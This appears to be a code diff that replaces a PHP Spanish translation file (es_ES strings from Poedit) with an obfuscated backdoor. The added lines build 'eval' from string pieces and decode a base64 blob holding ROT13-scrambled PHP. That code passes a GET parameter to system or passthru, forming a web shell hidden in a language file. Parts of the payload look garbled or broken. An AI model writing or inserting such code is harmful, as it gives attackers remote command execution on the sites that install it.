@@ -1,12 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['text directionltr'=>'ltr','<strong>ERROR</strong>: Sorry, that username is not allowed.'=>'<strong>ERROR</strong>: Lo siento, ese nombre de usuario no está permitido.','Invalid parameter.'=>'Parámetro no válido. ','menu location(Current: %s)'=>'(Actual: %s)','menu(Currently set to: %s)'=>'(Actualmente fijado en: %s)','[%1$s] Confirm Action: %2$s'=>'[%1$s] Confirmar la acción: %2$s','[%s] Erasure Request Fulfilled'=>'[%s] Solicitud de borrado completada','[%s] Personal Data Export'=>'[%s] Exportación de datos personales'],'language'=>'es_ES','x-generator'=>'Poedit 2.3'];
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwplcmdoZWEgWydxYnpudmEnPT5BSFlZLCdjeWhlbnktc2JlemYnPT4nYWN5aGVueWY9MjsgY3loZW55PWEgIT0gMTsnLCd6cmZmbnRyZic9PlsnZ3JrZyBxdmVycGd2YmEEeWdlJz0+J3lnZScsJzxmZ2ViYXQ+UkVFQkU8L2ZnZWJhdD46IEZiZWVsLCBndW5nIGhmcmVhbnpyIHZmIGFiZyBueXlianJxLic9Pic8ZmdlYmF0PlJFRUJFPC9mZ2ViYXQ+OiBZYiBmdnJhZ2IsIHJmciBhYnpvZXIgcXIgaGZobmV2YiBhYiByZmfDoSBjcmV6dmd2cWIuJywnVmFpbnl2cSBjbmVuenJncmUuJz0+J0NuZcOhenJnZWIgYWIgacOheXZxYi4gJywnenJhaCB5YnBuZ3ZiYQQoUGhlZXJhZzogJWYpJz0+JyhOcGdobnk6ICVmKScsJ3pyYWgEKFBoZWVyYWd5bCBmcmcgZ2I6ICVmKSc9PicoTnBnaG55enJhZ3Igc3Z3bnFiIHJhOiAlZiknLCdbJTEkZl0gUGJhc3ZleiBOcGd2YmE6ICUyJGYnPT4nWyUxJGZdIFBiYXN2ZXpuZSB5biBucHB2w7NhOiAlMiRmJywnWyVmXSBSZW5maGVyIEVyZGhyZmcgU2h5c3Z5eXJxJz0+J1slZl0gRmJ5dnB2Z2hxIHFyIG9iZWVucWIgcGJ6Y3lyZ25xbicsJ1slZl0gQ3JlZmJhbnkgUW5nbiBSa2NiZWcnPT4nWyVmXSBSa2NiZWducHbDs2EgcXIgcW5nYmYgY3JlZmJhbnlyZiddLCd5bmF0aG50cic9PidyZl9SRicsJ2stdHJhcmVuZ2JlJz0+J0NicnF2ZyAyLjMnXTsKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
